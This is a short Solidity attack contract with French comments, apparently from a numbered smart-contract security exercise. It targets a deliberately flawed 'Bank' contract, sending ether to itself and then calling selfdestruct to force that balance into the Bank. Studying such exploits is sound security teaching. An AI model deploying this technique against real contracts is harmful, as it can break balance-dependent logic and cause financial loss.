// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

//import "./Vault.sol";
import "./7-Bank-faille.sol";

contract Attack {
    Bank public bank;

    constructor(Bank _bank) {
        bank = _bank;
    }

    // une fall back payable pour mettre des sous sur le contrat attaquant
    //avant d'appeler le selfdestruct
    fallback() external payable{}
 
    //fonction fait juste  un self destruct sur @ contrat bank
    function attack() external {
        selfdestruct(payable(address(bank)));
    }

}
